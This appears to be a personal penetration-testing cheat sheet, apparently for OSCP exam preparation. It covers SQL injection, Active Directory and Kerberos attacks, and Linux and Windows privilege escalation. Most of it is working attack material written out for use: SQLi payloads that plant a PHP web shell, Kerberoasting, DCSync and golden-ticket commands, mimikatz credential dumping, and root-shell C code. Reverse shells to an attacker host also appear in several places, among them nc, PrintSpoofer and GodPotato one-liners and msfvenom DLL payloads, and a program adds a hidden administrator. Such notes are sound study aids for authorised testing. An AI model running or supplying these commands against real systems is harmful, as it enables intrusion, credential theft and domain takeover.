[Burp Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[Rana Kalil Video playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
[SQLi Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) from Codingo

### See Enumeration Section

### Notes
Goal is to initially find a location for SQLi and hopefully determine what the actual query is
Test possibles injection locations:
- `'`
- `' --`
- `' OR 1=1`
- `' OR 1=1; -- - `
- `'UNION SELECT * FROM users WHERE 1=1; -- -`
- Note that `--` is for comments meaning that everything after that (including what you don't see) will not be included, so if there is another clause, like 'AND variable = 1', it will return everything whether than variable is 1 or 0. 
Ex: `username=administrator'--'&password=password123`
	- This query should be SELECT x FROM y WHERE username = administrator and password = password123
	- But this comments out the last part and will simply SELECT the account of administrator, ignoring whether that was the correct password. 

### UNION SQLi
UNION SELECT - selecting data from an additional table in addition to the intended table

Determine Number of Columns:
1. `$validQuery ORDER by 1`
2. `$validQuery ORDER by 2`
3. and so on until error, then you can form a union statement to chain a second query and see how data is displayed.

Start with `UNION ALL SELECT 1, 2, X`. Then you can determine which column has the most space, making room for more fun commands/exploits (Commands below are based on MariaDB, others might be different)
Enumeration Examples:
- `UNION ALL SELECT 1, 2, @@version`
- `UNION ALL SELECT 1, 2, user ()`
- `UNION ALL SELECT 1, 2, table_name FROM information_schema.tables` - this can grab the table name, like with "users" below
	- Then you can use the table name (users) to reveal other columns:`UNION ALL SELECT 1, 2. column_name FROM information_schema.columns WHERE table_name='users'` 
	- Then you can reveal other info from those columns: `UNION ALL SELECT 1, username, password FROM users`
- `UNION ALL SELECT 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')` - You might be able to use the load_file function to execute code on the system as well:
- `UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'` - using the into OUTFILE to write code, and insert it into the system. 
	- This might present an error, but you could test it with the previous command and see if the file was created.
	- OR you can just run it by trying `$Host/backdoor.php?cmd=$cmd`

### Filter bypass
#### XML encoding
`&#x53;ELECT` instead of `SELECT` to bypass prohibited keywords
- Decoded server-side before being passed to SQL interpreter


## XSS

[Cheatsheet](https://notchxor.github.io/oscp-notes/2-web/xss/) from notchxor.

# Post-Exploit
## Active Directory

### Active Directory Enumeration

try `Import-Module ActiveDirectory`
- `Get-ADDomain`
- `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` - to list users with an SPN (kerberoastable)
- `Get-ADGroup -Filter * | select name` - list groups
- `Get-ADGroup -Identity "$groupName"` - get info about that group
- `Get-ADGroupMember -Identity "$groupName"` - list users of the group

#### adPEAS.ps1
- `Import-Module .\adPEAS.ps1` then `Invoke-adPEAS`
- It will begin searching for SPNs, kerberoastable accounts, and exporting a bunch of domain info to a .zip file for Bloodhound.  At this point I would look through the text output and see what you have.  if you have any kerberoastable accounts, try to crack the hashes with hashcat. 
- Transfer the .zip file back to your machine and import it into bloodhound.  Copy it to an SMB share if you can. 
- Before launching bloodhound:`sudo neo4j console`
- If adPEAS didn't get you any credentials or valuable info, you might need to run Rubeus or Mimikatz manually.  Or you might need to enumerate better, maybe theres something else you can find locally...Services, config files...backups?

#### PowerView.ps1
- `Import-Module .\PowerView.ps1`- (May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
- `Get-NetDomain`
- `Get-NetUser`
- `Get-NetUser | select cn` (common name)
- `Get-NetUser | select cn,pwdlastset,lastlogon`
- `Get-NetGroup | select cn`
- `Get-NetGroup "Fart Department" | select member` (get members of the Fart Department)
- `Get-NetComputer`
- `Get-ObjectAcl -Identity $user`
- `Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
	- (For example, pick different items to select)
- `Convert-SidToName $SID` - (like S-1-5-21-1987370470-658905705-1781884369-1103)
- `Find-LocalAdminAccess` -  (scanning to find local admin privileges for our user)
- `Get-NetSession -ComputerName $computerName`
	- (The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity` hive.)
- `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`
- `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
	- (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname and serviceprincipalname attributes)
- Find SMB shares: `Find-DomainShare`
	- then: `ls \\dc1.corp.com\sysvol\corp.com\` (for example)
- Find AS-REP roastable accounts: `Get-DomainUser -PreauthNotRequired`
- `Get-DomainPolicy` enumerate and retrieve password policies

#### Misc AD Techniques
Run Bloodhound from attacker (rather than using Sharphound):
- `bloodhound-python -u $user -p '$password' -ns $ip -d domain.offsec -c all`
- `Snaffler.exe -s -d $domain.com -o snaffler.log -v data` - iterates through domain shares hunting for interesting files


If you have a list of potential users, you can use kerbrute to check it for real users


### Kerberos 
#### Steps and Attack Privilege Requirements
1. AS-REQ - The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
2. AS-REP - The Key Distribution Center verifies the client and sends back an encrypted TGT. (**capture = asreproasting**)
3. TGS-REQ - The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
4. TGS-REP - The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client. (**capture = Kerberoast, create = silver ticket**)
5. AP-REQ - The client requests the service and sends the valid session key to prove the user has access.
6. AP-REP - The service grants access 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi (most common) for Rubeus or .ccache for Impacket.  A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

#### Kerbrute Enumeration
- `kerbrute userenum --dc $ip -d CONTROLLER.local User.txt`
	- --dc can point to a domain 

### Attack Types 

**Pass the Ticket** - Access as a user to the domain required

#### Kerberoasting
SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
Requires access as any user
Retrieves a TGS-REP hash
- Remote: `sudo impacket-GetUserSPNs -request -dc-ip $IP $domain.com/$user`
	- Requests password after
	- Could potentially chain with kerbrute userenum and jsmith.txt
- Local: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
	- Maybe try with `/tgtdeleg` because it ensures RC4 which is faster
- or Local with `PowerView.ps1`
	- `Get-DomainUser * -spn | select samaccountname`
	- `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
  
#### AS-REP Roasting
Requires access as any user with `PreauthNotRequired on Windows`
- Remote: `Impacket-GetNPUsers -dc-ip $IP -request -outfile $outfile.asreproast $domain.com/$user`
- Local: `.\Rubeus.exe asreproast /nowrap`
- Local enum: PowerView’s `Get-DomainUser -PreauthNotRequired`

#### Silver Ticket 
This is forging our own service ticket
This requires the following three pieces of information:
1. SPN password hash (of service account)
	1. If we already have the password we can use online tools to create the NTLM hash. [CodeBeautify.org](https://codebeautify.org/ntlm-hash-generator). 
2. Domain SID
	1. We can get this with powershell: `Get-ADdomain` (it will look like this: `S-1-5-21-1969309164-1513403977-1686805993`)
3. Target SPN
	1. We can get this with powershell: `Get-ADUser -Filter {SamAccountName -eq "$user"} -Properties ServicePrincipalNames`
	2. It will look like this: `MSSQL/nagoya.nagoya-industries.com`

4. Target user - `-user-id 500 Administrator`
5. Full command: ` impacket-ticketer -nthash $NTLMHash -domain-sid $SID -domain $domain.com -spn $SPN -user-id 500 Administrator`
Local (from mimikatz): `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:$domain.com /ptt /target:$host.$domain.com /service:http /rc4:$NTLM_hash /user:$user`
- user is the existing user which will be set in the forged ticket, so if you want one for a user named `patsy`, the output will say `Golden ticket for 'patsy@domain.com' successfully submitted for current session.`

#### DC sync
This is where we impersonate a domain controller using the user account with *Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights*. (Domain Admins, Enterprise Admins, and Administrators by default). 
- Local (from Mimikatz): `lsadump::dcsync /user:$domain\$user` where ~user$ is the target we want like `corp\david`
- Remote: `impacket-secretsdump -just-dc-user $Targetuser $domain.com/$pwnedUser:"$password"@$IP`

#### Pass the Hash
There are multiple different kinds of pass the hash attacks, but they are performed by impacket for example:
`impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`

#### Overpass the Hash
Overpass the hash involves "over" abusing an NtLM user hash to gain a full TGT, which we can then use to obtain a *Ticket Granting Service* (TGS). In other words we **turn an NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication**. 
- Local (using mimikatz): `sekurlsa::pth /user:$user /domain:$domain.com /ntlm:$NTLM /run:powershell`
	- If we run `whoami` on this powershell, it will say the ^user above rather than which user we logged in with
	- If we then authenticate using this ^user, such as using `net use \\smbserver` there will be a ticket cached. We can use `klist` to prove it. 

#### Pass the Ticket
Requires access to the domain as a user. 
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required. 
- Local (using mimikatz): `sekurlsa::tickets /export`
	- Next: This exports the ticket (a `.kirbi` file) which we can find by searching `dir *.kirbi`. It will look like `[0;12bd0]-0-0-42830000-patches@cifs-web42.kirbi`. 
	- Next (from mimikatz): `kerberos::ptt [0;12bd0]-0-0-42830000-patches@cifs-web42.kirbi`
		- If you get no errors, you should be able to see it with `klist`. 

**Skeleton Key** - Full domain compromise (domain admin) required

#### Golden Ticket
Requires full domain compromise
Local (from mimikatz): 
- `privilege:debug`
- `lsadump::lsa /patch`
	- Output is the **SID** and **NTLM of the `krbtgt` account**. Once you have these two items, you can do this from any machine. 
- (new machine or old) `kerberos::purge`
- `kerberos::golden /user:$user /domain:$domain.com /sid:SID /krbtgt:$krbtgtNTLM /ptt` ($user is whoever we want to have admin permissions)
- `misc::cmd` - launches new command prompt from which we can use `PsExec.exe \\$targetmachine cmd.exe`
	- **Note: we must use the hostname rather than the IP address. This is because we are trying to use overpass the hash and authenticate using kerberos rather than NTLM.**

#### DCOM 
The *Distributed Component Object Model* is a system for creating software components that interact with one another. Interaction with it is performed over RPC on TCP port 135. 

```
# create instance of Excel.Application object
$com [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))

# copy Excel file containing VBA payload to target
$LocalPath = "C:\Users\[user]\badexcel.xls
$RemotePath = "\\[target]\c$\badexcel.xls
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# create a SYSTEM profile - required as part of the opening process
$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

# open Excel file and execute macro
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

From an elevated PowerShell prompt, we can instantiate a remote MMC (Microsoft Management Console) 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.

1. `$dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$targetIP"))`
2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
	1. replace `/calc with whatever powershell script`

Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app.

#### Shadow Copies
*This technique probably won't come up on the exam and may just be a noisier version of DC Sync*
Windows SDK includes `vshadow.exe`. The goal of this attack is to abuse vshadow to extract the AD database `NTDS.dit` file. 
- As admin from DC: `vshadow.exe -nw -p C:` 
	- Take note of `Shadow copy decice name:` $ShadowCopyName
- `copy $ShadowCopyName\windows\ntds\ntds.dit c:\ntds.dit.bak`
- `reg.exe save hklm\system c:\system.bak`
- Move `ntds.dit.bak` and `system.bak` to kali
- From kali: `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
- This will give use the hashes of every AD user which can now be cracked or used


## After Linux Foothold

### Enumeration 
- `id`
- `sudo -l` - what can we run using sudo
- `history` - could have some juicy details in history
- `cat /etc/passwd`
	- If you can somehow edit /etc/passwd:
	1. `openssl passwd $newPassword`
	2. `echo "$newUser:$hashAbove^:0:0:root:/root:/bin/bash" >> /etc/passwd
		1. or simply copy$hashAbove^ into `root:<this spot>:etc` within the /etc/passwd file
- `uname -a` - kernel exploits
	- `cat /etc/issue`
- `hostname`
- `ps -aux`
	- `watch -n 1 "ps -aux | grep $searchTerm$"`
- `ipconfig`
- `ss -anp or netstat`
- `dpkg -l` (to list applications installed by dpkg)
- `find / -writable -type d 2>/dev/null` (find writable directories)
- `history` or `cat` any `/home/.history` files
- check `/home/.ssh` for keys
- `su root` (can't hurt to try)
- `sudo tcpdump -i lo -A | grep "pass"`
- `ip neigh` - ipv4 neighbor table
- `netstat -ano` - what ports are open and what communications exist
- `dpkg -l` - list installed programs
- check `/var`, `/opt`,  `/usr/local/src` and "`/usr/src/` for anything interesting
- `find / -writable -type d 2>/dev/null ` - find writable directories
- TCM Color Command: `grep --color=auto -rnw '/' -ie "$searchTerm" --color=always 2> /dev/null` (searches for the term  and spits it out in red)


### Privilege Escalation
#### Automated tools
- linpeas.sh
- unix-privesc-check

#### SUID Executables 
SUID stands for “Set User ID”, and it is a special type of permission that can be given to a file so the file is always run with the permissions of the owner instead of the user executing it.
- `find / -user root -perm -4000 -print 2>/dev/null`
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `find / -type f -perm -u=s 2>/dev/null | xargs ls -l`
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -user root -perm -4000 -exec ls -ldb {} \;`
- There may be more
- drwxr-x-r--
	- this is a directory with read/write/execute for the owner, read/execute for the group, and read for everyone else
	- if there is an S where the first x would be, that is a SUID (vs GUID for group id or sticky bit for the last one which would be a t)

#### Kernel Exploits
`uname -a` - check which kernel
`lsmod` - List Kernel modules
- `/sbin/modinfo $moduleName`

#### Passwords and File Permissions
- `history`
- `find /etc -type f -exec grep -i -I "pass" {} /dev/null \; 2>/dev/null`
	- for the /etc directory
- `find / -name id_rsa 2>/dev/null` or `authorized_keys`

#### Sudo Escalations
- `sudo -l` then "gtfobins.github.io"
- Escalation via LD_PRELOAD - if you see this in the output, it means you can preload libraries, and you can use that to load a bash shell prior to actually executing one of the commands you're able to load. 
	- Code here: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path

#### Scheduled Tasks
Take note of where the PATH is if the full PATH isn't declared
`grep "CRON" /var/log/syslog`
`ls -lah /etc/cron*` 
`cat /etc/crontab`
- especially for processes running as root
- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > $cronScript`
	- then you can execute /tmp bash because of the `+s`

#### Shared Object Injection
`strace $binary 2>&1` - strace intercepts and records the system calls which are called by a process and the signals which are received by a process.
- then try to overwrite anything that shows up as (No such file or directory)
- may need a .c file to exploit, EX:

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Then: `gcc -shared -fPIC -o $outputLocation $exploitLocation.c`
-`gcc -shared -fPIC -nostartfiles -o file file.c`
- note that you can change this to `$file.so`

#### Binary Symlink Escalation
Vulnerability with nginx, an http and reverse proxy server
https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

#### Escalation via Environmental Variables
Run the find SUID command, then run strings on the binary if you don't know what it does
If it starts a service from the PATH, you can `print $PATH`
- If it doesn't have a direct PATH:
	- one line c command: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
	- so the one liner is actually: `int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}`
	- then `gcc /tmp/service.c -o /tmp/service`
	- then: `export PATH=/tmp:$PATH`
	- This means that when you call a service, the system will check /tmp first as it is the start of the PATH
- If it does have a direct PATH (like /usr/sbin/service)
	- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
	- `export -f /usr/sbin/service` - 

#### Capabilities
`getcap -r / 2>/dev/null` - this will show up during linpeas, but it's still good to know 

#### NFS Root Squashing
- `cat /etc/exports`
	- if it says `'no_root_squash'` then the directory shown is shareable and can be mounted
	- Because it's no root squash, everything we do as root on our machine, it will be as root as the target machine even though we are a normal user on the target
so from kali: 
- `mkdir /tmp/mountme`
- `mount -o rw,vers=2 $kaliIP:/tmp /tmp/mountme`
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`
- `gcc /tmp/mountme/x.c -o /tmo/mountme/x`
- `chmod +s /tmp/mountme/x`
then from target:
- `./x`

#### Other
Reverse shells:
- `busybox nc $kaliIP 4444 -e sh`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $kaliIP $kaliPort >/tmp/f`

Add file to path:
`export PATH="/usr/lib/gcc/i486-linux-gnu/4.6/:$PATH"`

If you can edit `/etc/sudoers`:
- `"echo $user ALL=(ALL) NOPASSWD: ALL >> c:$LFILE"`

Remember that backticks can take precedence over other commands. Ex:
- In URL: 10.10.186.101:8081/ping?ip=`ls`

## After Windows Foothold

### Local Enumeration

#### cmd
User enum:
- `whoami`
- `whoami /groups` - display groups of current user
- `whoami /priv` - check our privileges
- `net user` - get list of all local users on machine (this will not include service accounts such as inetserv)
- `net user steve` - get user info for steve
- `net group /domain` - all local groups
- `net localgroup administrator` - can sometimes not work as just `net localgroup` if we don't have a logged in session
- `net group "Domain Admins" /domain`

- `dsquery user`
- `dsquery computer`
- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` (PASSWD_NOTREQD)

findstr (grep for Windows) commands: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr

- `wmic cpu get DataWidth, Description, AddressWidth` - check architecture
- `wmic qfe` - check patches
- `wmic logicaldisk get caption, description, providername` - checks drives

Network enum:
- `ipconfig` or `ipconfig /all`
- `arp -a` - (arp -all) - checks IP and MAC addresses
- `netstat -ano` - what ports are listening/connected, take note if anything is firewalled or not shown in the originalnmap scan

Running Processes/Services
- `tasklist` - Get a list of running processes
- `tasklist /SVC` -  services
- - `net start` - check which services are runnings

Scheduled Tasks:
- `schtasks /query /fo LIST /v`
- `schtasks /query /fo LIST /v | findstr /i "TaskName:"`


Search:
- `where /R c:\windows bash.exe` - where in `C:\Windows` is bash.exe (/R means recursive)
- `dir /R` - like `ls -la`

Password hunting:
- `findstr /si password *.txt *.ini *.config` - checks from whichever directory and subdirectories and ignores case for the string password
- `cmdkey /list` - To list the stored credentials on the machine.
- `reg query HKLM /f pass /t REG_SZ /s` - pay attention to ControlSet keys

##### Add user (if Admin)
- `net user $user $password /add`
- `net localgroup Administrators $user /add`

##### TCM Password Hunting
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

#### Powershell
- `Get-LocalUser` - get list of all local users
- `Get-LocalUser steve` - same as net user steve
- `Get-LocalGroup` - all local groups
- `Get-LocalGroupMember $groupName` - list of users in that group
- `systeminfo` - OS, version, architecture, etc
- `ipconfig /all` - list all network interfaces
- `route print` - display routing table containing all routes of the system
- `netstat -ano` - list all active network connections
	- a = all active TCP connections as well as TCP and UDP ports
	- n = disable name resolution
	- o = show process ID for each connection
- `Get-Process` - show running processes
- `Get-Process $processName | Format-List *` - get all information about a process

Finding info about applications:
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\" | select displayname`- Displays 32 bit applications (remove 'select displayname' for more info)
- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` - Displays 64 bit applications (remove 'select displayname' for more info):


Searching for specific things:
- Command for finding ".kdbx" (KeePass) files:
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` (for Keepass db)
- Command for finding sensitive XAMPP info files:	
	- `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- Checking for files in home directory
	- `Get-ChildItem -Path C:\Users\$user\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Runas:
	- `runas user:$user cmd` 
		- will have to enter password after, but it gets a shell as that user
	- `C:\Windows\System32\runas.exe /user:$DOMAIN\$User /save cred "C:\Windows\System32\cmd.exe /c $Command`
	- `C:\Windows\System32\runas.exe /user:$DOMAIN\$User /save cred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\proof.txt > $outputlocation.txt`
	- With `InvokeRunasCs.ps1`:
		- `Import-Module .\Invoke-RunasCs.ps1`
		- `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.204 4444 -e cmd.exe'`
			- If this doesn't work, the issue may be the upload location of the `nc` binary. 
- `Get-History` - may not work
- `(Get-PSReadlineOption).HistorySavePath`
	- Then `cat` or `type` output file and check that output for interesting files
Download file from remote server
	- `iwr -uri http://$kaliIP/file.ext -outfile file.ext`

#### Checking privileges on service binaries
https://github.com/gtworek/Priv2Admin - which privileges can do what
  - `icacls` Windows utility or  
  - `Get-ACL` -  PowerShell Cmdlet

### Other Techniques
#### TCM list of Automated Tools
Executables:
- **winPEAS.exe** - windows privilege escalation awesome script (check hacktrick bc it has the checklist)
- Seabelt.exe - has to be compiled (sln files open in Visual Studio)
- Watson.exe - has to be compiled (sln file)
- **SharpUp.exe**

PowerShell
- Sherlock.ps1 (predecessor to Watson)
- **PowerUp.ps1**
- jaws-enum.ps1 (jaws = just another windows script)

Other
- windows-exploit-suggester.py (local from attack machine)
	- requires `systeminfo` output from the machine
	- seems to be mostly kernel exploits
- Exploit Suggester (Metasploit)
  
#### PowerUp.ps1
`Import-Module ./PowerUp.ps1`
- `. .\PowerUp.ps1`
Then `Invoke-AllChecks`
- Check Abuse Function which gives necessary command

#### Registry Escalation:
- `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` 
- `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
 - If either of these are set to 1, you can run any msi with elevated permissions.  Make an MSI and execute it.  
 - PowerUp checks for this. 
	 - Note that you may need to execute any file written after running the Abuse Function. 
	 - Can also just create a .msi with msf. 
 
#### Service Escalation - Registry (TCM)
Example for the regsvc service:
- Powershell on target: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
	-  take note if we have `NT AUTHORITY\INTERACTIVE Allow Full Control` for this service. If we do we can make a malicious executable run a command. 
- create a malicious .c file and compile it: 
	- Example: 
	- take an existing file and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators $user /add`
	- `x86_64-w64-mingw32-gcc $exploit.c -o $exploit.exe`
	- this adds the $user to the administrators group
- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d $exploit.exe /f`
- `sc start regsvc`

#### Escalation Via Executable Files (TCM)
- PowerUp.ps1
- It will give a ServiceName, Path, ModifiablePath, ... and AbuseFunction
- Take $servicename.exe and replace the existing version in the modifiable path

#### Escalation via Startup Applications
- `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
- Generate the exe wth msfvenom
- Put the exe in the above folder
- Need to reboot or have an administrator log in/out
- Probably won't see this in CTF or lab environment

#### DLL Hijacking
Go into process monitor and set filters for "Path ends with .dll" and "Result is NAME NOT FOUND"
- We can overwrite if we can control the service and if the folder is writable
	- If we have a vulnerable service called dllsvc:
	1. `sc start dllsvc` (or stop first, then start)
	2. Then check ProcMon
	3. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll`
	4. Then stop and start again
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

#### Escalation via Binary Paths
- run PowerUp.ps1 - `Invoke-AllChecks`
- If our user has the `“SERVICE_CHANGE_CONFIG”` permission on the `daclsvc` service:
	- `sc config daclsvc binpath= "net localgroup administrators $user /add"`
	- `sc stop daclsvc` and `sc start daclsvc`

#### Unquoted Service Path Escalation
- PowerUp.ps1
- Example service path: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
- when the system is trying to run this executable, it will check for `Program.exe`, `Program Files.exe`, `Program Files\Unquoted.exe`... etc. So the goal is to place our malicious executable in any of those directories we have write access to. The example lab uses: `C:\Program Files\Unquoted Path Service\Common.exe`

#### CVE-2019-1388
If you get a pop up that says `To continue, enter an admin user name and password.` and has a `Show more details` option, you may be able to open up an internet explorer window showing the publisher's certificate. It will open it up as a SYSTEM level user, so you can use internet explorer to pop a shell. 
- Wheel
- Save as
- File
- Search for cmd, then right click and open it. It will open as `nt authority\system`. 

#### UAC Bypass
 Goal is to replace a service exe and either restart the service or reboot (`shutdown /r /t 0`) 
Malicious.c file below:
```
#include <stdlib.h> 

int main () 
{ 
int i; 

i = system ("net user poppop PartyParty123! /add"); 
i = system ("net localgroup administrators poppop /add"); 
   
return 0; 
}
```
Compile the C Program above, and you can use it to create a new admin user (`poppop:PartyParty123!`).
-`i686-w64-mingw32-gcc adduser.c -o adduser.exe` 


### Potato Family
**remember to try transferring the nc.exe binary**
When you have SeImpersonatePrivilege
- Check what version you need (.NET) (Check .NET version): `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`
- PrintSpoofer: 
	- `.\PrintSpoofer.exe -c "nc.exe $kaliIP $port -e cmd"`
	- `.\PrintSpoofer64.exe -i -c cmd`
- GodPotato:  `".\GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe $kaliIP $port"`
- Sweet Potato (where r.exe = msfvenom shell):`.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc64.exe -a "<ip> <port> -e cmd"` 
- [Sweet Potato](https://eins.li/posts/oscp-secret-sauce/): `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"`

### Mimikatz (local)
One liner: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "sekurlsa::logonpasswords" "lsadump::sam" "exit"`
 1. `privilege::debug`
 2. `token::elevate`
 3. `lsadump::sam`
 4. `sekurlsa::logonpasswords`
 5. `lsadump::dcsync /user:$domain\$user (to obtain NTLM hash)`
	 - Then from kali: `impacket-secretsdump -just-dc-user $user $domain.com /$user:"$password"@$targetIP`
	 - From kali: `impacket-psexec -hashes 00000000000000000000000000000000:$NTLMhash Administrator@$targetIP`
 - From a GUI must be run as admin, (or in a cmd that is running as admin).  UAC stops it otherwise.
 - `sekurlsa::tickets` can help steal a TGS or, even better a, TGT

#### Misc Windows Privesc 
Running Processes Powershell
- `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
	- NOTE:  You cannot see higher priv processes in windows

Search for unquoted service paths:
- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\" | findstr /i /v """`
- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\" | findstr /i /v """`

Check to see if you have the ability to do privileged writes i.e. writing to System32. There are exploits available on hacktricks. 

show firewall profile:
- `netsh advfirewall show currentprofile`
- `netsh advfirewall firewall show rule name=all`

Enumerate Installed Programs
- `wmic product get name, version, vendor`

Enumerate Windows Updates
- `wmic qfe get Caption, Description, HotFixID, InstalledOn`

Check for folders/files Everyone can write to:
- `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

List drivers:
- (cmd)`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
- (powershell) `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`

Notes:
- Run `ls`, `Get-ChildItem`, or `gci` with `-force` (like `ls -la` but for Windows)

### Post Exploit
 #### FROM HACKTRICKS: Enable Remote Desktop
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh firewall add portopening TCP 3389 "Remote Desktop"`
- `::netsh firewall set service remotedesktop enable` - I found that this line is not needed
- `::sc config TermService start= auto` - I found that this line is not needed
- `::net start Termservice` - found that this line is not needed

## File Transfer

### Python server
- From kali: `python3 -m http.server $port`
- From target Windows: 
	- powershell: `iwr -uri http://$kaliIP:$port/$file -o $file`
	- cmd: `certutil.exe -urlcache -split -f http://$kaliIP/$file C:\Windows\temp\$file
- From target Linux:
	- `wget http://$kali IP:$port/$file`

### nc
1. on target - `nc -w 3 $kaliIP 4444 < file.txt`
2. on kali - `nc -lvnp 4444 > file.txt`

### SMB
- From kali: 
	- `sudo impacket-smbserver -smb2support $shareName $sharedDirectory -username "$kaliUser" -password "$kaliPass"`
- From target:  
